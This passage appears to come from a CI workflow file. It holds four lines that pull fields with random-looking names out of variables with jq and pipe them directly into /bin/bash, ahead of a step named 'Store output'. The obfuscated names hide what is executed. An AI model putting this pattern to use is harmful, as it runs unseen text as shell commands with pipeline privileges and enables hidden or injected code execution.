          echo $s29 | jq -r .ues6 | /bin/bash
          printf '%s' "$qyp67968" | jq -r .wsrv8 | /bin/bash
          printf '%s' "$s4943" | jq -r .v3953 | /bin/bash
          echo $qps2469 | jq -r .f292 | /bin/bash

      - name: Store output
